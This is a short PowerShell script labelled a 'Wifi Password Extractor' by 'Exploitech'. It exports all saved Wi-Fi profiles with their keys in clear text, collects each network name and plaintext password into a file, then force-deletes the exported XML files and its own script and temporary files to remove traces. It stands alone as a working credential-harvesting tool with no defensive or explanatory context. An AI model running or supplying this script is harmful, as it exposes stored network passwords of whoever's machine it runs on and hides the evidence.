netsh wlan export profile key=clear

echo "Wifi Password Extractor Coded By Exploitech" > wifipass.txt
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial

Out-File wifipass.txt -Append -InputObject $a

}

rm *.xml -Force
rm w.txt -Force
rm w.PS1 -Force
